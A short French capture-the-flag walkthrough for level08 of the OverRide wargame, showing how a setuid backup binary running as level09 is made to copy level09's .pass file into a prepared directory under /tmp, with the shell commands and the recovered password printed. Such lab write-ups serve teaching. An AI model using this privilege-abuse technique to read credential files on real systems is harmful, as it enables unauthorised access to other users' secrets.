Le binaire level08 s'exécute avec les droits de level09 : il peut donc lire le .pass de level09 et en écrire une copie dans ./backups.
Il faut créer au préalable plusieurs répertoires pour que la fonction s'exécute correctement :

```
level08@OverRide:~$ cd /tmp

level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass

level08@OverRide:/tmp$ touch ./backups/.log

level08@OverRide:/tmp$ mkdir -p ./backups/home/users/level09

level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass

level08@OverRide:/tmp$ cat backups/home/users/level09/.pass 

fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S

```